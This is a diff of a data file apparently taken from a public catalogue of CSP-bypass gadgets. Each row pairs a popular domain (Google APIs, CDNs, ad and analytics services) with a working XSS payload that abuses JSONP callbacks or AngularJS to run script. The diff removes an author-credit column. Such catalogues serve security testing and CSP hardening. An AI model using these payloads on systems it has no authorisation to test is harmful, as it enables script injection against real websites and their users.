@@ -1,124 +1,124 @@
-Domain	Code	Author
-accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>	
-ads.yap.yahoo.com	<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>	
-ajax.googleapis.com	<body ng-app ng-csp><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & IvarsVids
-ap.lijit.com	<script src="https://ap.lijit.com/rtb/bid?callback=alert&br={%22id%22:%221%22,%22site%22:{%22domain%22:%22x%22,%22page%22:%22x%22}}"></script>	renniepak
-api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>	renniepak
-api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>	kevin_mizu
-api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>	renniepak
-api.facebook.com	<script src="https://api.facebook.com/restserver.php?method=fql.query&callback=alert"></script>	renniepak
-api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>	
-api.github.com	<script src="https://api.github.com/gist/anything?callback=alert"></script>	
-api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>	renniepak
-api.map.baidu.com	<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>	renniepak
-api.meetup.com	<script src="https://api.meetup.com/Toronto-Code-Mentoring/events?callback=alert"></script>	renniepak
-api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>	
-api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>	renniepak
-api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>	renniepak
-api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>	renniepak
-api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>	
-apis.google.com	<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>	
-apis.google.com	<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>	kevin_mizu
-app-sjint.marketo.com	<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>	
-app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>	renniepak
-apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-bebezoo.1688.com	<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>	
-bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>	renniepak
-c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>	renniepak
-cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>	renniepak
-cdn.bootcdn.net	<body ng-app ng-csp><script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-cdn.jsdelivr.net	<body ng-app ng-csp><script src="https://cdn.jsdelivr.net/npm/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>	ajxchapman
-cdn.shopify.com	<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>	renniepak
-cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & renniepak
-cdnjs.cloudflare.com	<body ng-app ng-csp><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-code.angularjs.org	<body ng-app ng-csp><script src="https://code.angularjs.org/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>	
-d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>	
-d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & renniepak
-developer.apple.com	<body ng-app ng-csp><script src="https://developer.apple.com/search/scripts/vendor/angular-custom.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & renniepak
-dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=alert"></script>	renniepak
-dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>	renniepak
-elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	Eduardo Vela
-eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=alert"></script>	renniepak
-fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>	renniepak
-forms.hubspot.com	<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>	renniepak
-geo.moatads.com	<script src="https://geo.moatads.com/n.js?callback=alert(document.domain)"></script>	renniepak
-gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>	renniepak
-global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>	renniepak
-graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>	kevin_mizu
-gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>	
-gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>	renniepak
-inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	Eduardo Vela & renniepak
-itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>	renniepak
-mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>	
-maps.google.com	<script src="https://maps.google.com/maps/api/js?sensor=false&callback=alert(1)"></script>	renniepak
-maps.googleapis.com	<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>	
-mc.yandex.ru	<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>	
-nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>	
-openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>	
-partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>	
-passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>	
-pixel.mathtag.com	<script src="https://pixel.mathtag.com/u/js?callback=alert(1)"></script>	renniepak
-pixel.quantserve.com	<script src="https://pixel.quantserve.com/api/segments.json?callback=alert"></script>	renniepak
-pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>	
-public-api.wordpress.com	<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>	renniepak
-query.fqtag.com	<script src="https://query.fqtag.com/b?callback=alert(1)"></script>	renniepak
-r.skimresources.com	<script src="https://r.skimresources.com/api/?callback=alert"></script>	renniepak
-recaptcha.net	<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>	
-s.fqtag.com	<script src="https://s.fqtag.com/b?callback=alert(1)"></script>	renniepak
-s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>	
-secure.adnxs.com	<script src="https://secure.adnxs.com/getuidp?callback=alert(1)"></script>	renniepak
-secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>	
-secure.quantserve.com	<script src="https://secure.quantserve.com/api/segments.json?callback=alert"></script>	renniepak
-shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>	renniepak
-social.yandex.ru	<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>	notdenied
-soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>	renniepak
-ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-st3.zoom.us	<body ng-app ng-csp><script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	Eduardo Vela & renniepak
-static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & renniepak
-storage.googleapis.com	<script src="https://storage.googleapis.com/bypass_csp/xss.js"></script>	kevin_mizu
-suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>	
-sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>	renniepak
-tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>	YoeriVegt
-tcr9i.openai.com	<script src="https://tcr9i.openai.com/fc/a/?callback=alert"></script>	renniepak
-translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>	renniepak
-translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>	
-translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>	
-udgnoz7mccyaowzp.public.blob.vercel-storage.com	<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>	w9w
-uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>	renniepak
-ulogin.ru	<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>	
-unpkg.com	<body ng-app ng-csp><script src="https://unpkg.com/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes
-vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>	
-visitor.pixplug.in	<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>	renniepak
-wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=alert"></script>	
-widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>	
-wikipedia.org	<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>	
-wordpress.org	<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>	
-www-api.ibm.com	<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>	renniepak
-www.ancestrycdn.com	<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	Eduardo Vela
-www.bing.com	<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>	renniepak
-www.blogger.com	<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>	
-www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>	YoeriVegt
-www.google.com	<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>	
-www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>	
-www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>	IvarsVids
-www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert()"></script>	
-www.googletagmanager.com	<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>	YoeriVegt
-www.gstatic.com	<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & IvarsVids
-www.gstatic.com	<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>	
-www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>	
-www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>	
-www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>	renniepak
-www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>	
-www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>	renniepak
-www.roblox.com	<script src="https://www.roblox.com/item-thumbnails?params=[{assetId:1}]&jsoncallback=alert"></script>	renniepak
-www.yastat.net	<body ng-app ng-csp><script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & Panya
-www.yastatic.net	<body ng-app ng-csp><script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & Panya
-www.youtube.com	<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>	
-yandex.st	<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$('head').html('<script>alert(1)</script>')">Test XSS</button>	notdenied
-yastat.net	<body ng-app ng-csp><script src="https://yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & Panya
-yastatic.net	<body ng-app ng-csp><script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Gareth Heyes & Panya
-yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	Eduardo Vela
+Domain	Code
+accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+ads.yap.yahoo.com	<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
+ajax.googleapis.com	<body ng-app ng-csp><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+ap.lijit.com	<script src="https://ap.lijit.com/rtb/bid?callback=alert&br={%22id%22:%221%22,%22site%22:{%22domain%22:%22x%22,%22page%22:%22x%22}}"></script>
+api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>
+api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>
+api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>
+api.facebook.com	<script src="https://api.facebook.com/restserver.php?method=fql.query&callback=alert"></script>
+api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>
+api.github.com	<script src="https://api.github.com/gist/anything?callback=alert"></script>
+api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>
+api.map.baidu.com	<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>
+api.meetup.com	<script src="https://api.meetup.com/Toronto-Code-Mentoring/events?callback=alert"></script>
+api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>
+api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>
+api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>
+api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>
+api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
+apis.google.com	<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>
+apis.google.com	<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>
+app-sjint.marketo.com	<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
+app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>
+apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+bebezoo.1688.com	<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>
+bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>
+c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
+cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>
+cdn.bootcdn.net	<body ng-app ng-csp><script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+cdn.jsdelivr.net	<body ng-app ng-csp><script src="https://cdn.jsdelivr.net/npm/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>
+cdn.shopify.com	<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>
+cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+cdnjs.cloudflare.com	<body ng-app ng-csp><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+code.angularjs.org	<body ng-app ng-csp><script src="https://code.angularjs.org/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
+d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
+d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+developer.apple.com	<body ng-app ng-csp><script src="https://developer.apple.com/search/scripts/vendor/angular-custom.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=alert"></script>
+dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>
+elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=alert"></script>
+fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>
+forms.hubspot.com	<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>
+geo.moatads.com	<script src="https://geo.moatads.com/n.js?callback=alert(document.domain)"></script>
+gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>
+global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>
+graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>
+gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
+gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>
+inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
+mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
+maps.google.com	<script src="https://maps.google.com/maps/api/js?sensor=false&callback=alert(1)"></script>
+maps.googleapis.com	<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>
+mc.yandex.ru	<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>
+nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>
+openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>
+partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>
+passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>
+pixel.mathtag.com	<script src="https://pixel.mathtag.com/u/js?callback=alert(1)"></script>
+pixel.quantserve.com	<script src="https://pixel.quantserve.com/api/segments.json?callback=alert"></script>
+pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>
+public-api.wordpress.com	<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>
+query.fqtag.com	<script src="https://query.fqtag.com/b?callback=alert(1)"></script>
+r.skimresources.com	<script src="https://r.skimresources.com/api/?callback=alert"></script>
+recaptcha.net	<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>
+s.fqtag.com	<script src="https://s.fqtag.com/b?callback=alert(1)"></script>
+s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
